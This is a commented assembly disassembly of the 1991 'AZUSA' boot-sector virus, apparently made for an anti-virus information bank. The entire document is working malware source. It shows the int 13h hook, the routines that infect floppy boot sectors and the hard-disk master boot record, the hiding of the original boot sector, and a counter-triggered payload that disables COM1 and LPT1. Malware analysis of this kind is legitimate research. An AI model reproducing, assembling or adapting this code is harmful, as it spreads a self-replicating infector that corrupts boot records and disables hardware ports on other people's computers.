

;========================================================
;		   Virus "AZUSA"			;
;	dissasembly of floppy disk boot sector		;
;	  (or hard disk master boot sector)		;
;							;
;	dissasembled: Marek Sell, July 1991		;
;							;
;	(C) Polish Section of Virus Information Bank	;
;--------------------------------------------------------

LF	EQU	0AH
CR	EQU	0DH

S0000	SEGMENT
	ASSUME DS:S0000, SS:S0000 ,CS:S0000 ,ES:S0000
	ORG	7C00h

L7C00:	JMP	L7C8E					;7C00 E9 8B 00

	DB	'MSDOS3.3'				;7C03 4D 53 44 4F 53 33 2E 33

;===============================================
;	New int 13h handling routine
;-----------------------------------------------
L0C0B:	TEST	AH,2		;read/write ?		;7C0B F6 C4 02
	JZ	L7C6B		;-> no, exit		;7C0E 74 5B
	TEST	DL,80H		;HDD ?			;7C10 F6 C2 80
	JNZ	L7C6B		;-> yes, exit		;7C13 75 56
	PUSH	AX					;7C15 50
	PUSH	DS					;7C16 1E
	XOR	AX,AX					;7C17 31 C0
	MOV	DS,AX					;7C19 8E D8
	MOV	AL,DL		;drive			;7C1B 88 D0
	INC	AL					;7C1D FE C0
	TEST	AL,DS:43FH	;diskette drive motor	;7C1F 84 06 3F 04
	JNZ	L7C69		;-> ON, exit		;7C23 75 44
	PUSH	BX					;7C25 53
	PUSH	CX					;7C26 51
	PUSH	DX					;7C27 52
	PUSH	ES					;7C28 06
	PUSH	DI					;7C29 57
	PUSH	SI					;7C2A 56
	MOV	AX,201H		;read 1 sector		;7C2B B8 01 02
	PUSH	CS					;7C2E 0E
	POP	ES					;7C2F 07
	MOV	BX,200H		;buffer			;7C30 BB 00 02
	MOV	CX,1		;track 0 record 1	;7C33 B9 01 00
	MOV	DH,0		;head 0			;7C36 B6 00
	CALL	L7C70		;oryginal int 13h	;7C38 E8 35 00
	JB	L7C63		;-> error, exit		;7C3B 72 26
	PUSH	CS					;7C3D 0E
	POP	DS					;7C3E 1F
	MOV	AX,DS:[289h]				;7C3F A1 89 02
	CMP	AX,DS:[89h]				;7C42 3B 06 89 00
	JZ	L7C63		;-> infected		;7C46 74 1B
	MOV	AX,301H		;write 1 sector		;7C48 B8 01 03
	MOV	CX,2708H	;track 39, sector 8	;7C4B B9 08 27
	MOV	DH,1		;head 1			;7C4E B6 01
	CALL	L7C70		;oryginal int 13h	;7C50 E8 1D 00
	JB	L7C63		;-> error, exit		;7C53 72 0E
	CALL	L7C77		;prepare to infection	;7C55 E8 1F 00
	MOV	AX,301H		;write 1 sector		;7C58 B8 01 03
	XOR	BX,BX		;virus code address	;7C5B 31 DB
	INC	CX		;track 0, sector 1	;7C5D 41
	MOV	DH,0		;head 0			;7C5E B6 00
	CALL	L7C70		;oryginal int 13h	;7C60 E8 0D 00
L7C63:	POP	SI					;7C63 5E
	POP	DI					;7C64 5F
	POP	ES					;7C65 07
	POP	DX					;7C66 5A
	POP	CX					;7C67 59
	POP	BX					;7C68 5B
L7C69:	POP	DS					;7C69 1F
	POP	AX					;7C6A 58
L7C6B:	;JMP	F000:9D13				;7C6B EA 13 9D 00 F0
	db	0EAh
L7C6C	dw	09D13h	;oryginal int 13h offset
L7C6E	dw	0F000h	;oryginal int 13h segment

;================================================
;	oryginal int 13h
;------------------------------------------------
L7C70:	PUSHF						;7C70 9C
	CALL	DWORD PTR CS:[6Ch]	;int 13h	;7C71 2E FF 1E 6C 00
	RETN						;7C76 C3

;================================================
;	Subroutine "prepare to infection"
;------------------------------------------------
L7C77:	MOV	SI,203H		;OEM name		;7C77 BE 03 02
	MOV	DI,3					;7C7A BF 03 00
	MOV	CX,8		;name length		;7C7D B9 08 00
	CLD						;7C80 FC
	REPZ	MOVSB					;7C81 F3 A4
	MOV	SI,370H		;End of oryginal	;7C83 BE 70 03
	MOV	DI,170H					;7C86 BF 70 01
Key:	MOV	CL,90H					;7C89 B1 90
	REPZ	MOVSB					;7C8B F3 A4
	RETN						;7C8D C3

;================================================
;	Start up code
;------------------------------------------------
L7C8E:	XOR	AX,AX					;7C8E 31 C0
	MOV	DS,AX					;7C90 8E D8
	MOV	SS,AX					;7C92 8E D0
	MOV	SP,OFFSET L7C00				;7C94 BC 00 7C
	MOV	AX,DS:4CH	;int 13h offset		;7C97 A1 4C 00
	MOV	word ptr [L7C6C],AX			;7C9A A3 6C 7C
	MOV	AX,DS:4EH	;int 13h segment	;7C9D A1 4E 00
	MOV	word ptr [L7C6E],AX			;7CA0 A3 6E 7C
	MOV	AX,DS:[413h]	;BIOS memory size	;7CA3 A1 13 04
	DEC	AX		;- 1 KB			;7CA6 48
	MOV	DS:[413h],AX				;7CA7 A3 13 04
	MOV	CL,6					;7CAA B1 06
	SHL	AX,CL		;KB -> paragraph	;7CAC D3 E0
	MOV	ES,AX					;7CAE 8E C0
	MOV	WORD PTR DS:[4Ch],000Bh	;int 13h offs	;7CB0 C7 06 4C 00 0B 00
	MOV	DS:[4Eh],AX		;	 seg	;7CB6 A3 4E 00
	MOV	CX,200H			;virus length	;7CB9 B9 00 02
	MOV	SI,OFFSET L7C00		;source		;7CBC BE 00 7C
	XOR	DI,DI			;target		;7CBF 31 FF
	CLD						;7CC1 FC
	REPZ	MOVSB			;copy virus code;7CC2 F3 A4
	PUSH	AX					;7CC4 50
	MOV	AX,0CAH			;= offset L7CCA	;7CC5 B8 CA 00
	PUSH	AX					;7CC8 50
	RETF						;7CC9 CB

L7CCA:	XOR	AX,AX		;disk reset		;7CCA 31 C0
	INT	13H					;7CCC CD 13
	XOR	AX,AX					;7CCE 31 C0
	MOV	ES,AX					;7CD0 8E C0
	MOV	AX,201H		;read 1 sector		;7CD2 B8 01 02
	MOV	BX,OFFSET L7C00				;7CD5 BB 00 7C
	PUSH	CS					;7CD8 0E
	POP	DS					;7CD9 1F
	CALL	L7D1C		;read act.part.boot sec.;7CDA E8 3F 00
	TEST	CL,0FFH					;7CDD F6 C1 FF
	JZ	L7CEA		;-> not found, FDD	;7CE0 74 08
	CALL	L7D36					;7CE2 E8 51 00
L7CE5:	;JMP	0000:7C00				;7CE5 EA 00 7C 00 00
	db	0EAh
	dw	07C00h
	dw	00000h

L7CEA:	MOV	CX,2708H	;track 39 sector 8	;7CEA B9 08 27
	MOV	DX,100H		;head 1, drive A:	;7CED BA 00 01
	INT	13H					;7CF0 CD 13
	JB	L7CE5		;error			;7CF2 72 F1

	;-------HDD infection
	PUSH	CS					;7CF4 0E
	POP	ES					;7CF5 07
	MOV	AX,201H		;read 1 sector		;7CF6 B8 01 02
	MOV	BX,200H		;buffer			;7CF9 BB 00 02
	MOV	CX,1		;track 0 sector 1	;7CFC B9 01 00
	MOV	DX,80H		;head 0 drive c:	;7CFF BA 80 00
	INT	13H					;7D02 CD 13
	JB	L7CE5		;-> error		;7D04 72 DF

	MOV	AX,DS:289H				;7D06 A1 89 02
	CMP	DS:89H,AX				;7D09 39 06 89 00
	JZ	L7CE5		;-> allready infected	;7D0D 74 D6
	CALL	L7C77		;prepare to infection	;7D0F E8 65 FF
	MOV	AX,301H		;write 1 sector		;7D12 B8 01 03
	XOR	BX,BX		;virus code		;7D15 31 DB
	INC	CX		;track 0, sector 1	;7D17 41
	INT	13H					;7D18 CD 13
	JMP	SHORT	L7CE5				;7D1A EB C9

;================================================
;	Subroutine
;------------------------------------------------
L7D1C:	MOV	SI,1BEH			;partition table;7D1C BE BE 01
	MOV	CX,4			;4 partitions	;7D1F B9 04 00
L7D22:	CMP	BYTE PTR [SI],80H	;active partit	;7D22 80 3C 80
	JZ	L7D2E			;-> found	;7D25 74 07
	ADD	SI,10H			;next partition	;7D27 83 C6 10
	LOOP	L7D22					;7D2A E2 F6
	JMP	SHORT	L7D35		;-> no active	;7D2C EB 07

L7D2E:	MOV	CX,[SI+2]		;track/sector	;7D2E 8B 4C 02
	MOV	DX,[SI]			;head/drive C:	;7D31 8B 14
	INT	13H					;7D33 CD 13
L7D35:	RETN						;7D35 C3

;================================================
;	Subroutine
;------------------------------------------------
L7D36:	TEST	BYTE PTR DS:[16Fh],0E0H	;= L7D6F	;7D36 F6 06 6F 01 E0
	JNZ	L7D52			;-> 1/32 	;7D3B 75 15
	ADD	BYTE PTR DS:[16Fh],1	;counter + 1	;7D3D 80 06 6F 01 01
L7D42:	MOV	AX,301H			;write 1 sector	;7D42 B8 01 03
	PUSH	CS					;7D45 0E
	POP	ES					;7D46 07
	XOR	BX,BX			;virus code	;7D47 31 DB
	MOV	CX,1			;track 0 sect 1	;7D49 B9 01 00
	MOV	DH,0			;head 0		;7D4C B6 00
	INT	13H					;7D4E CD 13
	JMP	SHORT	L7D60				;7D50 EB 0E

;================================================
;	Disable COM1/LPT1
;------------------------------------------------
L7D52:	XOR	AX,AX					;7D52 31 C0
	MOV	DS,AX					;7D54 8E D8
	MOV	BYTE PTR DS:408H,0	;LPT1		;7D56 C6 06 08 04 00
	MOV	BYTE PTR DS:400H,0	;COM1		;7D5B C6 06 00 04 00
L7D60:	PUSH	CS					;7D60 0E
	POP	DS					;7D61 1F
	MOV	BYTE PTR DS:16FH,0	;L7D6F		;7D62 C6 06 6F 01 00
	MOV	BYTE PTR DS:15AH,0	;L7D5A		;7D67 C6 06 5A 01 00
	RETN						;7D6C C3

	db	0,0				;7D6D 00 00

L7D6F	db	0			;counter	;7D6F 00

;================================================
;	Copied from oryginal boot sector
;------------------------------------------------
	db	8Ah,36h,2Ah			;7D70 8A 36 2A
	JL	L7D42				;7D73 7C CD
	ADC	AX,BX				;7D75 13 C3
	DB	CR,LF				;7D77 0D 0A
	DB	'Non-System disk or disk error',CR,LF	
			;7D79 4E 6F 6E 2D 53 79 73 74 65 6D 20 64 69 73 6B 20 6F 72 20 64 69 73 6B 20
	DB	'Replace and strike any key when ready',CR,LF	
			;7D98 52 65 70 6C 61 63 65 20 61 6E 64 20 73 74 72 69 6B 65 20 61 6E 79 20 6B
	DB	0,CR,LF				;7DBF 00 0D 0A
	DB	'Disk Boot failure',CR,LF	;7DC2 44 69 73 6B 20 42 6F 6F 74 20 66 61 69 6C 75 72
	DB	0,'IO      SYSMSDOS   SYS',0,0,0,0,0,0,0	
			;7DD5 00 49 4F 20 20 20 20 20 20 53 59 53 4D 53 44 4F 53 20 20 20 53 59 53 00
	DB	0,0,0,0,0,0,0,0,0,0,0,'U',0AAH	;7DF3 00 00 00 00 00 00 00 00 00 00 00 55 AA
L9D13	EQU	$+1F13H
LF000	EQU	$+7200H
	S0000	ENDS
;
END	

